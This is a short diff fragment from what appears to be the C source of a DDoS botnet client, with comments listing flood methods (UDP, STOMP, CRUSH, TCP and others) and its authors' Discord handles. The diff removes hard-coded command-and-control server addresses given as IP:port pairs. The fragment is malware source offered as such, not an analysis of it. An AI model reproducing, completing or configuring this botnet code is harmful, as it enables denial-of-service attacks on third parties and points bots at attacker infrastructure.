@@ -153,8 +153,8 @@ VSE: Believed to be a mixture between UDP and STD, basically an upgraded STD Flo
 #define methods "UDP, STOMP, CRUSH, KOSHA, TCP, STD", ""
 // OwO Whos this! Its the team!!!! || Why is all of this here you ask? simply because im baked off my ass and you guys made me code this motherfucker (':
 ////////////////////////////////////////
-unsigned char *KoshaProject[] = {"23.254.244.244:23"}; // <ServerIP>:<BotPort> || Cri: {"185.244.25.189:23"}; || Swizz: {"165.227.72.112:23"};
-unsigned char *AltServer[] = {"185.244.25.189:23"};  // {"23.254.244.244:23"}; || 
+ 
+ 
 ////////////////////////////////////////
 char *cri_discord = "Georgia Cri#4337";
 char *swizz_discord = "Swizz#2599";
